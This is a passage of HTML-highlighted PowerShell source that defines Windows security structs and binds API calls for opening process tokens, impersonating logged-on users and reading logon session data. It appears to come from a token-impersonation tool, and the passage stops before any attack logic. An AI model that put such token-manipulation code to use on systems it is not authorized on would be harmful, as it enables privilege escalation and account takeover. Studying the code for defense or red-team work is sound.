    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PasswordCanChange'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PasswordMustChange'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$SECURITY_LOGON_SESSION_DATA</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct STARTUPINFO</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'STARTUPINFO'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'cb'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'lpReserved'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'lpDesktop'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'lpTitle'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwX'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwY'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwXSize'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwYSize'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwXCountChars'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwYCountChars'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwFillAttribute'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwFlags'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'wShowWindow'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'cbReserved2'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'lpReserved2'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hStdInput'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hStdOutput'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hStdError'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$STARTUPINFO</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct PROCESS_INFORMATION</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'PROCESS_INFORMATION'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hProcess'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hThread'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwProcessId'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwThreadId'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$PROCESS_INFORMATION</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct TOKEN_ELEVATION</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'TOKEN_ELEVATION'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TokenIsElevated'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TOKEN_ELEVATION</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct LUID_AND_ATTRIBUTES</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LUID_AND_ATTRIBUTES'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">,</span> 12<span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Luid'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Attributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$LUID_AND_ATTRIBUTES</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct TOKEN_PRIVILEGES</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'TOKEN_PRIVILEGES'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">,</span> 16<span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PrivilegeCount'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Privileges'</span><span class="token punctuation">,</span> <span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TOKEN_PRIVILEGES</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct ACE_HEADER</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'ACE_HEADER'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AceType'</span><span class="token punctuation">,</span> <span class="token namespace">[Byte]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AceFlags'</span><span class="token punctuation">,</span> <span class="token namespace">[Byte]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AceSize'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$ACE_HEADER</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct ACL</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'ACL'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AclRevision'</span><span class="token punctuation">,</span> <span class="token namespace">[Byte]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Sbz1'</span><span class="token punctuation">,</span> <span class="token namespace">[Byte]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AclSize'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AceCount'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Sbz2'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$ACL</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct ACE_HEADER</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'ACCESS_ALLOWED_ACE'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Header'</span><span class="token punctuation">,</span> <span class="token variable">$ACE_HEADER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Mask'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'SidStart'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$ACCESS_ALLOWED_ACE</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct TRUSTEE</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'TRUSTEE'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'pMultipleTrustee'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'MultipleTrusteeOperation'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TrusteeForm'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TrusteeType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ptstrName'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TRUSTEE</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct EXPLICIT_ACCESS</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'EXPLICIT_ACCESS'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'grfAccessPermissions'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'grfAccessMode'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'grfInheritance'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Trustee'</span><span class="token punctuation">,</span> <span class="token variable">$TRUSTEE</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$EXPLICIT_ACCESS</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">###############################</span>


    <span class="token comment" spellcheck="true">###############################</span>
    <span class="token comment" spellcheck="true">#Win32Functions</span>
    <span class="token comment" spellcheck="true">###############################</span>
    <span class="token variable">$OpenProcessAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll OpenProcess
    <span class="token variable">$OpenProcessDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>
    <span class="token variable">$OpenProcess</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenProcessAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenProcessDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$OpenProcessTokenAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll OpenProcessToken
    <span class="token variable">$OpenProcessTokenDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$OpenProcessToken</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenProcessTokenAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenProcessTokenDelegate</span><span class="token punctuation">)</span>    

    <span class="token variable">$GetTokenInformationAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll GetTokenInformation
    <span class="token variable">$GetTokenInformationDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$GetTokenInformation</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$GetTokenInformationAddr</span><span class="token punctuation">,</span> <span class="token variable">$GetTokenInformationDelegate</span><span class="token punctuation">)</span>    

    <span class="token variable">$SetThreadTokenAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll SetThreadToken
    <span class="token variable">$SetThreadTokenDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$SetThreadToken</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$SetThreadTokenAddr</span><span class="token punctuation">,</span> <span class="token variable">$SetThreadTokenDelegate</span><span class="token punctuation">)</span>    

    <span class="token variable">$ImpersonateLoggedOnUserAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll ImpersonateLoggedOnUser
    <span class="token variable">$ImpersonateLoggedOnUserDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$ImpersonateLoggedOnUser</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$ImpersonateLoggedOnUserAddr</span><span class="token punctuation">,</span> <span class="token variable">$ImpersonateLoggedOnUserDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$RevertToSelfAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll RevertToSelf
    <span class="token variable">$RevertToSelfDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>
    <span class="token variable">$RevertToSelf</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$RevertToSelfAddr</span><span class="token punctuation">,</span> <span class="token variable">$RevertToSelfDelegate</span><span class="token punctuation">)</span>

    <span class="token variable">$LsaGetLogonSessionDataAddr</span> = Get<span class="token operator">-</span>ProcAddress secur32<span class="token punctuation">.</span>dll LsaGetLogonSessionData
